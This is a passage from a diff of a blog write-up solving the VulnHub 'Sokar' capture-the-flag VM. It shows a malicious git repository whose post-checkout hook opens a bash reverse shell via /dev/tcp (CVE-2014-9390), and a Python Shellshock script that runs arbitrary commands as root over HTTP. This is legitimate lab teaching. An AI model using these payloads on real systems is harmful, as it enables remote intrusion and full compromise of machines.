+uid<span style=color:#f92672>=</span>501<span style=color:#f92672>(</span>apophis<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>502<span style=color:#f92672>(</span>apophis<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>502<span style=color:#f92672>(</span>apophis<span style=color:#f92672>)</span>
+<span style=color:#f92672>[</span>apophis@sokar ~<span style=color:#f92672>]</span>$
 </code></pre></div><p>With the interactive shell as <code>apophis</code> now, I was able to accept the SSH hostkey check.</p>
 <p>The next thing left on the list was to prepare a <code>git</code> repository that can actually be cloned. Setting one up is reaaaaally simple. Because I knew that it will be looking for <code>/root/secret-project</code>, I prepared just that on my Kali VM:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ cd /root
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ cd /root
 leonjza@kali/root $ mkdir secret-project
 leonjza@kali/root $ cd secret-project
 leonjza@kali/root/secret-project $ git init --bare
 Initialized empty Git repository in /root/secret-project/
 leonjza@kali/root/secret-project | git:master $
-</code></pre></div><p>Thats it&hellip; Next, I cloned it locally in a different folder.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar $ git clone ssh://127.0.0.1/root/secret-project
-Cloning into <span style="color:#87ceeb">&#39;secret-project&#39;</span>...
-root@127.0.0.1&#39;s password:
+</code></pre></div><p>Thats it&mldr; Next, I cloned it locally in a different folder.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar $ git clone ssh://127.0.0.1/root/secret-project
+Cloning into <span style=color:#e6db74>&#39;secret-project&#39;</span>...
+root@127.0.0.1<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
 warning: You appear to have cloned an empty repository.
 leonjza@kali/sokar $ cd secret-project
 leonjza@kali/sokar/secret-project | git:master $
-</code></pre></div><p>Done. Working from a PoC exploit found <a href="https://gitlab.com/mehmet/cve-2014-9390">here</a>, I continued to prepare a similar exploit, except for the fact that I changed the actual hook to connect to my Mac (hosting the VM&rsquo;s) on a <code>tcp/22</code> netcat listener, spawning a shell. I knew <code>tcp/22</code> traffic was allowed due to the SSH host key verification step that needed some work :)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">leonjza@kali/sokar/secret-project | git:master $ mkdir .Git
+</code></pre></div><p>Done. Working from a PoC exploit found <a href=https://gitlab.com/mehmet/cve-2014-9390>here</a>, I continued to prepare a similar exploit, except for the fact that I changed the actual hook to connect to my Mac (hosting the VM&rsquo;s) on a <code>tcp/22</code> netcat listener, spawning a shell. I knew <code>tcp/22</code> traffic was allowed due to the SSH host key verification step that needed some work :)</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>leonjza@kali/sokar/secret-project | git:master $ mkdir .Git
 leonjza@kali/sokar/secret-project | git:master $ cd .Git
 leonjza@kali/sokar/secret-project/.Git | git:master $ mkdir hooks
 leonjza@kali/sokar/secret-project/.Git | git:master $ cd hooks
 leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ vim post-checkout
 leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ cat post-checkout
-<span style="color:#0f0">#!/bin/sh</span>
-bash -i &gt;&amp; /dev/tcp/192.168.217.1/22 0&gt;&amp;<span style="color:#f60">1</span>
+<span style=color:#75715e>#!/bin/sh</span>
+bash -i &gt;&amp; /dev/tcp/192.168.217.1/22 0&gt;&amp;<span style=color:#ae81ff>1</span>
 leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ chmod +x ./post-checkout
 leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git add -A
-leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git commit -m <span style="color:#87ceeb">&#39;pwnd&#39;</span>
-[master (root-commit) ee364fd] pwnd
+leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git commit -m <span style=color:#e6db74>&#39;pwnd&#39;</span>
+<span style=color:#f92672>[</span>master <span style=color:#f92672>(</span>root-commit<span style=color:#f92672>)</span> ee364fd<span style=color:#f92672>]</span> pwnd
  Committer: root &lt;root@localhost.localdomain&gt;
 
- <span style="color:#f60">1</span> file changed, <span style="color:#f60">2</span> insertions(+)
- create mode <span style="color:#f60">100755</span> .Git/hooks/post-checkout
+ <span style=color:#ae81ff>1</span> file changed, <span style=color:#ae81ff>2</span> insertions<span style=color:#f92672>(</span>+<span style=color:#f92672>)</span>
+ create mode <span style=color:#ae81ff>100755</span> .Git/hooks/post-checkout
 leonjza@kali/sokar/secret-project/.Git/hooks | git:master $ git push -u origin master
-root@127.0.0.1&#39;s password:
-Counting objects: 5, <span style="color:#f00">done</span>.
-Compressing objects: 100% (2/2), <span style="color:#f00">done</span>.
-Writing objects: 100% (5/5), <span style="color:#f60">345</span> bytes, <span style="color:#f00">done</span>.
-Total <span style="color:#f60">5</span> (delta 0), reused <span style="color:#f60">0</span> (delta 0)
+root@127.0.0.1<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
+Counting objects: 5, <span style=color:#66d9ef>done</span>.
+Compressing objects: 100% <span style=color:#f92672>(</span>2/2<span style=color:#f92672>)</span>, <span style=color:#66d9ef>done</span>.
+Writing objects: 100% <span style=color:#f92672>(</span>5/5<span style=color:#f92672>)</span>, <span style=color:#ae81ff>345</span> bytes, <span style=color:#66d9ef>done</span>.
+Total <span style=color:#ae81ff>5</span> <span style=color:#f92672>(</span>delta 0<span style=color:#f92672>)</span>, reused <span style=color:#ae81ff>0</span> <span style=color:#f92672>(</span>delta 0<span style=color:#f92672>)</span>
 To ssh://127.0.0.1/root/secret-project
- * [new branch]      master -&gt; master
+ * <span style=color:#f92672>[</span>new branch<span style=color:#f92672>]</span>      master -&gt; master
 Branch master set up to track remote branch master from origin.
 leonjza@kali/sokar/secret-project/.Git/hooks | git:master $
 </code></pre></div><p>With my evil repository ready, it was time to try that <code>build</code> again :)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">[apophis@sokar ~]$ ./build
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>apophis@sokar ~<span style=color:#f92672>]</span>$ ./build
 ./build
-Build? (Y/N) Y
+Build? <span style=color:#f92672>(</span>Y/N<span style=color:#f92672>)</span> Y
 Y
-Cloning into <span style="color:#87ceeb">&#39;/mnt/secret-project&#39;</span>...
-root@sokar-dev&#39;s password: <span style="color:#0f0"># redact lol</span>
+Cloning into <span style=color:#e6db74>&#39;/mnt/secret-project&#39;</span>...
+root@sokar-dev<span style=color:#960050;background-color:#1e0010>&#39;</span>s password: <span style=color:#75715e># redact lol</span>
 
-remote: Counting objects: 5, <span style="color:#f00">done</span>.
-remote: Compressing objects: 100% (2/2), <span style="color:#f00">done</span>.
-Receiving objects: 100% (5/5), <span style="color:#f00">done</span>.
-remote: Total <span style="color:#f60">5</span> (delta 0), reused <span style="color:#f60">0</span> (delta 0)
-Checking connectivity... <span style="color:#f00">done</span>.
+remote: Counting objects: 5, <span style=color:#66d9ef>done</span>.
+remote: Compressing objects: 100% <span style=color:#f92672>(</span>2/2<span style=color:#f92672>)</span>, <span style=color:#66d9ef>done</span>.
+Receiving objects: 100% <span style=color:#f92672>(</span>5/5<span style=color:#f92672>)</span>, <span style=color:#66d9ef>done</span>.
+remote: Total <span style=color:#ae81ff>5</span> <span style=color:#f92672>(</span>delta 0<span style=color:#f92672>)</span>, reused <span style=color:#ae81ff>0</span> <span style=color:#f92672>(</span>delta 0<span style=color:#f92672>)</span>
+Checking connectivity... <span style=color:#66d9ef>done</span>.
 
 </code></pre></div><p>This shell just &lsquo;hung&rsquo; there, however, the netcat listener on my Mac had a different story to tell:</p>
 <pre><code>leonjza@laptop » sudo nc -lv 22
@@ -1036,241 +903,91 @@ cat /root/flag
 |    rasta_mouse (@_RastaMouse)     |
 =====================================
 [root@sokar secret-project]#
-</code></pre><h2 id="conclusion">conclusion</h2>
+</code></pre><h2 id=conclusion>conclusion</h2>
 <p>What a blast! Them feels of r00t are so <em>gooood</em>. For the curios, that firewall that was making life so difficult:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">[root@sokar secret-project]<span style="color:#0f0"># cat /etc/sysconfig/iptables</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>root@sokar secret-project<span style=color:#f92672>]</span><span style=color:#75715e># cat /etc/sysconfig/iptables</span>
 cat /etc/sysconfig/iptables
-<span style="color:#0f0"># Firewall configuration written by system-config-firewall</span>
-<span style="color:#0f0"># Manual customization of this file is not recommended.</span>
+<span style=color:#75715e># Firewall configuration written by system-config-firewall</span>
+<span style=color:#75715e># Manual customization of this file is not recommended.</span>
 *filter
-:INPUT ACCEPT [0:0]
-:FORWARD ACCEPT [0:0]
-:OUTPUT ACCEPT [0:0]
+:INPUT ACCEPT <span style=color:#f92672>[</span>0:0<span style=color:#f92672>]</span>
+:FORWARD ACCEPT <span style=color:#f92672>[</span>0:0<span style=color:#f92672>]</span>
+:OUTPUT ACCEPT <span style=color:#f92672>[</span>0:0<span style=color:#f92672>]</span>
 -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
 -A INPUT -p icmp -j DROP
 -A INPUT -i lo -j ACCEPT
--A INPUT -m state --state ESTABLISHED -p tcp --sport <span style="color:#f60">22</span> -j ACCEPT
--A INPUT -m state --state NEW,ESTABLISHED -p tcp --dport <span style="color:#f60">591</span> -j ACCEPT
--A INPUT -p udp --sport <span style="color:#f60">53</span> -j ACCEPT
--A OUTPUT -m state --state NEW,ESTABLISHED -m owner --uid-owner <span style="color:#f60">0</span> -p tcp --dport <span style="color:#f60">22</span> -j ACCEPT
--A OUTPUT -p udp --dport <span style="color:#f60">53</span> -m owner --uid-owner <span style="color:#f60">0</span> -j ACCEPT
--A OUTPUT -m state --state ESTABLISHED -p tcp --sport <span style="color:#f60">591</span> -j ACCEPT
--A OUTPUT -m state --state NEW,ESTABLISHED -m owner --gid-owner <span style="color:#f60">501</span> -p tcp --dport <span style="color:#f60">51242</span> -j ACCEPT
+-A INPUT -m state --state ESTABLISHED -p tcp --sport <span style=color:#ae81ff>22</span> -j ACCEPT
+-A INPUT -m state --state NEW,ESTABLISHED -p tcp --dport <span style=color:#ae81ff>591</span> -j ACCEPT
+-A INPUT -p udp --sport <span style=color:#ae81ff>53</span> -j ACCEPT
+-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --uid-owner <span style=color:#ae81ff>0</span> -p tcp --dport <span style=color:#ae81ff>22</span> -j ACCEPT
+-A OUTPUT -p udp --dport <span style=color:#ae81ff>53</span> -m owner --uid-owner <span style=color:#ae81ff>0</span> -j ACCEPT
+-A OUTPUT -m state --state ESTABLISHED -p tcp --sport <span style=color:#ae81ff>591</span> -j ACCEPT
+-A OUTPUT -m state --state NEW,ESTABLISHED -m owner --gid-owner <span style=color:#ae81ff>501</span> -p tcp --dport <span style=color:#ae81ff>51242</span> -j ACCEPT
 -A OUTPUT -j DROP
 COMMIT
-</code></pre></div><h2 id="edit">edit</h2>
+</code></pre></div><h2 id=edit>edit</h2>
 <p>I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the <code>lime</code> script run with <code>sudo</code> can be shocked too!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#0f0">#!/usr/bin/python</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python</span>
 
-<span style="color:#0f0"># 2015 Leon Jacobs</span>
-<span style="color:#0f0"># sokar remote root command execution</span>
+<span style=color:#75715e># 2015 Leon Jacobs</span>
+<span style=color:#75715e># sokar remote root command execution</span>
 
-<span style="color:#f00">import</span> requests
-<span style="color:#f00">import</span> sys
+<span style=color:#f92672>import</span> requests
+<span style=color:#f92672>import</span> sys
 
-<span style="color:#f00">if</span> len(sys.argv) &lt; <span style="color:#f60">2</span>:
+<span style=color:#66d9ef>if</span> len(sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>:
 
-    print <span style="color:#87ceeb">&#34; * Usage </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb"> &lt;cmd&gt;&#34;</span> % sys.argv[<span style="color:#f60">0</span>]
-    sys.exit(<span style="color:#f60">1</span>)
+    print <span style=color:#e6db74>&#34; * Usage </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> &lt;cmd&gt;&#34;</span> <span style=color:#f92672>%</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>0</span>]
+    sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>1</span>)
 
-<span style="color:#0f0"># Grab the command from the args</span>
-command = sys.argv[<span style="color:#f60">1</span>].strip()
+<span style=color:#75715e># Grab the command from the args</span>
+command <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>strip()
 
-<span style="color:#0f0"># prep to shock the lime script</span>
-root_command = <span style="color:#87ceeb">&#34;&#34;&#34;echo &#34;N&#34; | sudo MAIL=</span><span style="color:#87ceeb">\\</span><span style="color:#87ceeb">&#34;() { :;}; </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">;</span><span style="color:#87ceeb">\\</span><span style="color:#87ceeb">&#34; /home/bynarr/lime&#34;&#34;&#34;</span> % command
+<span style=color:#75715e># prep to shock the lime script</span>
+root_command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;echo &#34;N&#34; | sudo MAIL=</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;() { :;}; </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34; /home/bynarr/lime&#34;&#34;&#34;</span> <span style=color:#f92672>%</span> command
 
-<span style="color:#0f0"># prep to exec the command as bynarr</span>
-payload = <span style="color:#87ceeb">&#34;&#34;&#34;/usr/bin/python -c &#34;import time; time.sleep(1); print &#39;fruity&#39;&#34; | /usr/bin/python -c &#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#39;, &#39;bynarr&#39;]);&#34; &#34;&#34;&#34;</span> % root_command
+<span style=color:#75715e># prep to exec the command as bynarr</span>
+payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;/usr/bin/python -c &#34;import time; time.sleep(1); print &#39;fruity&#39;&#34; | /usr/bin/python -c &#34;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;, &#39;bynarr&#39;]);&#34; &#34;&#34;&#34;</span> <span style=color:#f92672>%</span> root_command
 
-<span style="color:#0f0"># be verbose about the full command</span>
-print <span style="color:#87ceeb">&#34; * Executing </span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span> % payload
+<span style=color:#75715e># be verbose about the full command</span>
+print <span style=color:#e6db74>&#34; * Executing </span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> payload
 
-<span style="color:#0f0"># Send the sploit</span>
-headers = { <span style="color:#87ceeb">&#34;User-Agent&#34;</span>: <span style="color:#87ceeb">&#34;() { :;};echo;</span><span style="color:#87ceeb">%s</span><span style="color:#87ceeb">&#34;</span> % payload }
-print requests.get(<span style="color:#87ceeb">&#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>, headers=headers).text.strip()
-</code></pre></div><p>Run with <code>python root.py &quot;/bin/cat /root/flag&quot;</code> :D</p>
-<p>Thanks to <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> for the VM, and as always, <a href="https://twitter.com/VulnHub">@VulnHub</a> for the hosting and great community!</p>
-    </div>
-  </article>
-
-  
-  
-
-
-
-
-  
-    <div class="blog-post-comments">
-        <div id="disqus_thread">
-          <script type="text/javascript">
-          
-          (function() {
-              
-              
-              
-              
-          
-              var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-              var disqus_shortname = 'slashnote';
-              dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-          })();
-          </script>
-          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-          <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-        </div>
-    </div>
-
-  
-
-
-  <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-          <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-          <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-          <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#introduction">introduction</a></li>
-    <li><a href="#a-usual-start">a usual start</a></li>
-    <li><a href="#cgi-bincat">/cgi-bin/cat</a></li>
-    <li><a href="#making-life-easier">making life easier</a></li>
-    <li><a href="#egress-firewalls-le-suck">egress firewalls le-suck</a></li>
-    <li><a href="#bynarr-the-fruit">bynarr the fruit</a></li>
-    <li><a href="#the-scary-linux-memory-extractor">the scary linux memory extractor</a></li>
-    <li><a href="#build-the-clone-to-the-hook">build the clone to the hook</a>
-      <ul>
-        <li><a href="#the-impossible-b0f">the impossible b0f</a></li>
-        <li><a href="#inspecting-git">inspecting git</a></li>
-      </ul>
-    </li>
-    <li><a href="#rooting-sokar">rooting sokar</a>
-      <ul>
-        <li><a href="#preparing-the-environment-and-exploit">preparing the environment and exploit</a></li>
-      </ul>
-    </li>
-    <li><a href="#conclusion">conclusion</a></li>
-    <li><a href="#edit">edit</a></li>
-  </ul>
-</nav>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      
-      <ul>
-  
-  
-    
-  
-  
-  <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f" aria-label="Facebook">
-      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&text=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge" aria-label="Twitter">
-      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&title=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge" aria-label="Linkedin">
-      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&is_video=false&description=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge" aria-label="Pinterest">
-      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="mailto:?subject=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f" aria-label="Email">
-      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&title=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge" aria-label="Pocket">
-      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&title=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge" aria-label="reddit">
-      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&name=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge&description=%3ch2%20id%3d%22introduction%22%3eintroduction%3c%2fh2%3e%0a%3cp%3e%3ca%20href%3d%22http%3a%2f%2fblog.vulnhub.com%2f2015%2f01%2fvulnhub-is-0b10.html%22%3eVulnhub%20is%200b10%3c%2fa%3e%20years%20old.%20That%20is%20binary%20for%202%20%3a%29%20In%20order%20to%20celebrate%20this%2c%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2f_RastaMouse%22%3e%40_RastaMouse%3c%2fa%3e%0acreated%20%3ca%20href%3d%22https%3a%2f%2fwww.vulnhub.com%2fentry%2fsokar-1%2c113%2f%22%3eSokar%3c%2fa%3e.%3c%2fp%3e%0a%3cfigure%3e%3cimg%20src%3d%22%2fimages%2fsokar_logo.png%22%2f%3e%0a%3c%2ffigure%3e%0a%0a%3cp%3eSokar%20was%20used%20as%20another%20writeup%20competition%20%28the%20first%20for%202015%29%2c%20similar%20to%20the%20%3ca%20href%3d%22https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f09%2f18%2ffrom-persistence%2f%22%3ePersistence%3c%2fa%3e%20challenge%20from%20Sep%20%26lsquo%3b14.%0aFrom%20the%20%3ca%20href%3d%22http%3a%2f%2fblog.vulnhub.com%2f2015%2f01%2fcompetition-sokar.html%22%3ecompetition%20announcement%20blogpost%3c%2fa%3e%2c%20the%20rules%20of%20engagement%20were%20pretty%20familiar.%20Boot%20the%20VM%2c%20pwn%20it%20via%20the%20network%20and%20find%20the%20flag.%0aOf%20course%2c%20modifying%20the%20VM%20in%20order%20to%20help%20you%20get%20the%20flag%20%28things%20like%20single%20user%20mode%2c%20rescue%20disks%20etc%29%20are%20not%20allowed%20and%20you%20have%20to%20actually%20be%20able%20to%20prove%20how%20you%20got%20r00t.%3c%2fp%3e%0a%3cp%3eSokar%20frustrated%20me.%20A%20lot.%20However%2c%20almost%20all%20of%20the%20challenges%20and%20configurations%20of%20Sokar%20were%20plausible.%20Most%20of%20the%20vulnerabilities%20are%20valid%20in%20the%20sense%20that%20it%20may%20as%20well%20be%20out%20there%20in%20wild.%20So%2c%20it%20was%20a%20great%20learning%20experience%20once%20again%21%3c%2fp%3e%0a%3cp%3eHere%20is%20my%20entry%20for%20the%20competition.%20Enjoy%21%20%3a%29%3c%2fp%3e" aria-label="Tumblr">
-      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2015%2f02%2f21%2fbeating-sokar-the-vulnhub-turns-0b10-challenge%2f&t=beating%20sokar%20the%20vulnhub%20turns%200b10%20challenge" aria-label="Hacker News">
-      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-      
-        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
-          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
-          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
-          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
-          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+<span style=color:#75715e># Send the sploit</span>
+headers <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;User-Agent&#34;</span>: <span style=color:#e6db74>&#34;() { :;};echo;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> payload }
+print requests<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;http://192.168.217.163:591/cgi-bin/cat&#34;</span>, headers<span style=color:#f92672>=</span>headers)<span style=color:#f92672>.</span>text<span style=color:#f92672>.</span>strip()
+</code></pre></div><p>Run with <code>python root.py "/bin/cat /root/flag"</code> :D</p>
+<p>Thanks to <a href=https://twitter.com/_RastaMouse>@_RastaMouse</a> for the VM, and as always, <a href=https://twitter.com/VulnHub>@VulnHub</a> for the hosting and great community!</p>
 </div>
-
-
-  <footer id="footer">
-  <div class="footer-left">
-    Copyright  &copy; 2021  Leon Jacobs 
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-        <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-        <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-        <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </nav>
-  </div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h>Read other posts</span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises-nebula/>
+<span class=button__icon>←</span>
+<span class=button__text>playing exploit-exercises - nebula</span>
+</a>
+</span>
+<span class="button next">
+<a href=https://leonjza.github.io/blog/2015/02/20/a-trivial-ios-jailbreak-detection-bypass/>
+<span class=button__text>a trivial iOS jailbreak detection bypass</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
+</div>
 </footer>
-
-
-  </div>
+<script src=https://leonjza.github.io/assets/main.js></script>
+<script src=https://leonjza.github.io/assets/prism.js></script>
+</div>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
 </body>
-
-<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
-<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
-<script src=https://leonjza.github.io/js/main.js></script>
-<script src=https://leonjza.github.io/js/code-copy.js></script>
-
-
-
 </html>
